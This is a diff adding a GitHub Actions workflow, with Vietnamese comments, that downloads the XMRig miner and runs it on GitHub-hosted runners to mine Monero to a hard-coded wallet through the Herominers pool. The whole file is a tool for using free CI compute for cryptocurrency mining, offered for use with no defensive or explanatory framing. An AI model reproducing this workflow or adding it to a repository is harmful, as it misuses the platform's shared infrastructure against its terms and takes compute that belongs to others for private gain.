@@ -1,1 +1,34 @@
+name: Mine XMR on Herominers
 
+on:
+  workflow_dispatch:
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Install dependencies
+        run: |
+          sudo apt update -y
+          sudo apt install -y wget tar
+
+      - name: Download & Run XMRig
+        run: |
+          # Cấu hình cơ bản
+          POOL="de.monero.herominers.com:1111"
+          WALLET="82tvM9cdwYieKVPKCHx6TJVKbekciy3hSGr54XDEYNYt6atNYkGSeeSS9qrVyjjrufMeyTaiBBTAWFuZG11gdKMc1a31YMG"
+          WORKER="gh-actions"
+
+          # Tải miner
+          wget -q https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz -O xmrig.tar.gz
+          tar -xzf xmrig.tar.gz
+          cd xmrig-6.24.0
+
+          chmod +x xmrig
+          echo "🚀 Bắt đầu đào XMR trên Herominers pool..."
+          echo "⛏️  Pool: $POOL"
+          echo "👛  Ví: $WALLET"
+
+          # Chạy trực tiếp, hiển thị log ra console
+          ./xmrig -o $POOL -u $WALLET -p $WORKER -a rx/0 --donate-level=1 --tls
